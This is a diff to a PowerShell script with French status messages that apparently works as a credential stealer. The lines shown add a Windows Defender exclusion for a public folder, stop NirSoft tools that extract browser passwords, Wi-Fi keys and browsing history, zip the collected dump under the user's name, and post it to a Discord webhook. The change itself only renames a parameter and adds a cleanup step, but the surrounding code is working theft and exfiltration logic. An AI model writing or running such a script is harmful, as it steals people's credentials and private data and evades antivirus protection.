@@ -1,7 +1,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)]
-    [string]$WebhookUrl
+    [string]$webhookUrl
 )
 
 Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green
@@ -9,6 +9,10 @@ Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green
 $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
+
+# Nettoyage préventif pour libérer les fichiers s'ils sont verrouillés
+Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
 
 Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
 Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
@@ -89,7 +93,7 @@ $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue
 $content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))
 
 try { 
-    $client.PostAsync($WebhookUrl, $content).Wait() 
+    $client.PostAsync($webhookUrl, $content).Wait() 
     Write-Host "[+] Envoi reussi !" -ForegroundColor Green
 } catch {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
